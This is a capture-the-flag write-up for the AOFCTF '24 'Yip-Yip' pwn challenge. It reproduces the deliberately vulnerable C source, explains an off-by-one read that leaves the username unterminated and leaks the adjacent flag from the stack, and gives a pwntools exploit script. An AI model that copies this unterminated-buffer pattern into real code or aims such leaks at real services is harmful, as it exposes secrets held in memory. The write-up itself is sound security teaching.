@@ -1,0 +1,255 @@
+---
+title: AOFCTF '24 - Pwn - Yip-Yip
+date: '2024-04-29'
+tags: ['pwn', 'aofctf', 'off-by-one']
+draft: false
+summary: Utilizing an Off-by-One error to overwrite the null-byte of string and keep printing the stack content until a nullbyte.
+---
+
+## Challenge Description
+
+![alt text](/static/writeups/aofctf-24/image-9.png)
+
+## Solution
+
+In this challenge, we had the source, and all of the mitigations were enabled:
+
+```c
+// Compile: gcc -o yip-yip yip-yip.c
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <signal.h>
+#include <string.h>
+#include <unistd.h>
+
+#define MAX_INPUT_SZ 0x18
+#define MAX_USER_SZ 0x8
+
+__attribute__((constructor))
+void __constructor__(){
+    setvbuf(stdin, NULL, _IONBF, 0);
+    setvbuf(stdout, NULL, _IONBF, 0);
+    setvbuf(stderr, NULL, _IONBF, 0);
+    signal(SIGALRM, exit);
+    alarm(0x20);
+}
+
+void get_input(int *in) {
+    // Secure integer input function.
+    // https://stackoverflow.com/questions/41145908/how-to-stop-user-entering-char-as-int-input-in-c
+    char next;
+    if (scanf("%d", in) < 0 || *in < 0 || ((next = getchar()) != EOF && next != '\n')) {
+         clearerr(stdin);
+         do next = getchar(); while (next != EOF && next != '\n');
+         clearerr(stdin);
+    }
+}
+
+void err(int code) {
+    switch(code) {
+    case 0:
+        printf("[ERROR] - Contact the administrator.\n");
+        break;
+    case 18:
+        printf("You are too young to be doing this.\n");
+        break;
+    default:
+        printf("Are your trying do something naughty??\n");
+    }
+    exit(-1);
+}
+
+
+int read_flag(char* flag_buf) {
+    if(!flag_buf) err(0);
+    memset(flag_buf, 0, 0x100);
+    FILE *fp = fopen("flag.txt", "r");
+    if(!fp) err(0);
+    return fread(flag_buf, 1, 0x100, fp);
+}
+
+typedef enum {
+    MALE,
+    FEMALE,
+    OTHER,
+    NONE
+} gender_t;
+
+typedef struct {
+    char username[MAX_INPUT_SZ];
+    int age;
+    gender_t gender;
+} user_t;
+int is_registered = 0;
+
+void prompt_input(char* msg, char* buffer, size_t sz) {
+    printf("%s", msg);
+    read(stdin, buffer, sz);
+}
+
+char* gender_to_char(gender_t gender) {
+    return ((gender == MALE) ?
+        "MALE" : (
+            (gender == FEMALE) ? "FEMALE" : "OTHER"
+        ));
+}
+
+void print_user(const user_t* user) {
+    printf("Username   : %s\n", user->username);
+    if(user->age < 18) err(18);
+    printf("Age        : %d\n", user->age);
+    printf("Gender     : %s\n", gender_to_char(user->gender));
+}
+
+int menu() {
+    int idx;
+    printf(" === Reg-Menu ===\n");
+    printf("01. Register yourself\n");
+    printf("02. Check your details\n");
+    printf("03. Un-register yourself\n");
+    printf("69. Get the flag\n");
+    printf("00. Exit\n");
+    printf(">> ");
+    get_input(&idx);
+    return idx;
+}
+
+void setup_user(user_t *user) {
+    if(!user) err(1);
+    memset(user->username, NULL, MAX_INPUT_SZ);
+    user->age = 0;
+    user->gender = NONE;
+    is_registered = 0;
+}
+
+void register_user(user_t* user) {
+    if(!user) err(1);
+    if(is_registered) {
+        printf("You cannot register twice.");
+        return;
+    }
+    printf("Enter your username: ");
+    read(0, user->username, MAX_INPUT_SZ);
+
+    printf("What's your age? ");
+    scanf("%d", &user->age);
+
+    printf("What's your gender (0=Male, 1=Female, 2=Other)? ");
+    scanf("%d", &user->gender);
+
+    printf("User registered successfully!\n");
+}
+
+int main() {
+
+    user_t user;
+    char flag[0x100];
+    int opt;
+
+    setup_user(&user);
+
+    while((opt = menu())) {
+        switch(opt) {
+        case 1:
+            register_user(&user);
+            break;
+        case 2:
+            print_user(&user);
+            break;
+        case 3:
+            setup_user(&user);
+            break;
+        case 69:
+            read_flag(flag);
+            break;
+        default:
+            printf("Invalid choice. Try again..\n");
+            break;
+        }
+    }
+}
+```
+
+So, the bug in this challenge is minute. It's an `off-by-one`. That is, in `read` function, if we pass in the size as the exact size of the buffer, we can write till the last byte, which is supposed to be a null-byte to indicate the end of string. So, if we write past the null-byte, when we call `printf`, we can read arbitrary values.
+
+```c
+printf("Enter your username: ");
+read(0, user->username, MAX_INPUT_SZ);
+```
+
+The source code is fairly simple, let's analyze main:
+
+```c:main
+int main() {
+
+    user_t user;
+    char flag[0x100];
+    int opt;
+
+    setup_user(&user);
+
+    while((opt = menu())) {
+        switch(opt) {
+        case 1:
+            register_user(&user);
+            break;
+        case 2:
+            print_user(&user);
+            break;
+        case 3:
+            setup_user(&user);
+            break;
+        case 69:
+            read_flag(flag);
+            break;
+        default:
+            printf("Invalid choice. Try again..\n");
+            break;
+        }
+    }
+}
+```
+
+The user struct is declared right before the `flag` buffer on the stack. Let's checkout the `print_user` function:
+
+```c:print_user
+void print_user(const user_t* user) {
+    printf("Username   : %s\n", user->username);
+    if(user->age < 18) err(18);
+    printf("Age        : %d\n", user->age);
+    printf("Gender     : %s\n", gender_to_char(user->gender));
+}
+```
+
+The `print_user` function is fairly simple, it will simply print.
+
+## Exploitation
+
+The exploitation steps are pretty clear, since we have three inputs, we have an off-by-one in `register_user:username`. However, if we need to also fill in the `4-bytes` buffer for `age`. As well as the `4-bytes` buffer of `gender_t`. But, before doing that, we must invoke `69`, so that the flag is stored on the stack. So, once that's done, we can easily read the flag from the stack. The final exploit becomes:
+
+```py:exploit.py
+#!/usr/bin/env python3
+
+from pwn import *
+
+encode = lambda e: e if type(e) == bytes else str(e).encode()
+
+exe = "./yip-yip"
+elf = context.binary = ELF(exe)
+io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
+
+# Read the flag
+io.sendlineafter(b">> ", b"69")
+
+# Register the user:
+io.sendlineafter(b">> ", b"01")
+io.sendlineafter(b": ", cyclic(0x18))
+io.sendlineafter(b"? ", encode(0xFFFFFFFF))
+io.sendlineafter(b"? ", encode(0xFFFFFFFF))
+
+# Print:
+io.sendlineafter(b">> ", b"02")
+
+io.interactive()
+```
